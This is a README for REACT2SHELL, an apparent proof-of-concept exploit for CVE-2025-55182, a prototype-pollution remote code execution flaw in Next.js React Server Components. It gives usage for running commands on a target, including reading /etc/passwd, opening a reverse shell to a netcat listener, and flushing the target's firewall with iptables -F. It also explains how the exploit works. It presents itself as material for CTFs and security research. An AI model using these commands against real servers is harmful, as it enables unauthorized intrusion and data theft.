# REACT2SHELL

## 🎯 Quick Overview (What is this?)

This tool is a simple Proof-of-Concept (PoC) exploit for **CVE-2025-55182**. This is a serious flaw (Prototype Pollution) found in **Next.js** applications that use **React Server Components**.

If a target server is vulnerable, this script lets you run operating system commands on it (Remote Code Execution, or RCE).

This tool is built for learning, CTFs, and responsible security research.

<img width="1764" height="964" alt="Screenshot 2025-12-12 214115" src="https://github.com/user-attachments/assets/6ccaf2e6-e322-4cb7-997b-6ab2ae5dab8b" />

## ⚠️ Disclaimer for Students & CTF Players

**USE ETHICALLY.** Only run this exploit against systems you own or have explicit, documented permission to test. Unauthorized use is illegal. This tool is for educational purposes only.

## 🌟 How to Use It

This tool has three main ways to run commands: a simple single command, a full interactive web console, and an attempt at a classic reverse shell.

### ⚙️ Installation

1.  **Get the code:**

    ```bash
    git clone https://github.com/raivenLockdown/WEB-CLI_RCE_React2Shell.git
    cd REACT2SHELL
    ```

2.  **Install the library:**

    ```bash
    pip install requests
    ```

### Mode 1: Interactive Web Console (Recommended for CTFs)

This is the easiest way to interact with the target. It starts a local web page on your machine that acts like a terminal.

1.  **Run the script:**

    ```bash
    python3 exploit.py <TARGET_URL> --web-cli
    ```

    *Example:* `python3 exploit.py http://target.com/ --web-cli`

2.  **Open your browser:** The script will tell you to open `http://127.0.0.1:8000/`. You can then type commands (like `ls`, `whoami`, `cat /etc/passwd`) directly into the web page.

### Mode 2: Single Command Execution

Run one command and get the output immediately in your local terminal. Good for quick checks like finding your user ID.

```bash
python3 exploit.py <TARGET_URL> --cmd '<COMMAND>'
```

*Example:* `python3 exploit.py http://target.com/ --cmd 'id'`

### Mode 3: Reverse Shell Attempt

Use this mode if you want a stable, persistent connection. **Note:** This often fails in real-world environments due to firewalls (egress filtering).

1.  **Start your listener (e.g., `netcat`):**

    ```bash
    nc -lvnp 55555
    ```

2.  **Run the exploit:**

    ```bash
    python3 exploit.py <TARGET_URL> -i <YOUR_IP> -p 55555 [--flush]
    ```

      * `-i <YOUR_IP>`: Your machine's IP.
      * `-p 55555`: The port your listener is using.
      * `--flush` (Optional): Tries to run `iptables -F` on the target first to clear host firewalls.

-----

## 🔬 Technical Explanation (How the Exploit Works)

The exploit uses a **Prototype Pollution** flaw to achieve RCE.

1.  **Prototype Pollution:** The script sends a specially crafted payload to a vulnerable Next.js endpoint. This payload exploits a flaw in how the server processes data, allowing us to add properties to the basic JavaScript object structure (`Object.prototype`).
2.  **RCE Trigger:** We pollute a specific, internal property that controls what code the server runs (using Node.js's `child_process`). We replace that property's value with our shell command.
3.  **Output Capture:** When running commands in the single-command or web CLI modes, the exploit makes the server execute the command (`execSync`) and immediately throw a harmless error. The output of the command is cleverly stuffed into the error message's `digest` field. The Python script then reads this field to get the results.

## 🤝 References and Credits

This research relies on the initial work and disclosure by the security community. Thank you to all researchers and open-source contributors.

### 📚 Key References

  * [Original PoC Repository for CVE-2025-55182](https://github.com/msanft/CVE-2025-55182) - (The foundation for this exploit.)
  * [Original PoC Code Example](https://github.com/msanft/CVE-2025-55182/blob/main/poc.py) - (The initial code example.)
  * [Critical Security Vulnerability in React Server Components](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components) - (Official React blog post on the issue.)
  * [Critical Vulnerability in React (CVE-2025-55182)](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182) - (Detailed security analysis.)
  * [React Server Functions Documentation](https://react.dev/reference/rsc/server-functions) - (Official docs explaining the context of how the vulnerable components work.)
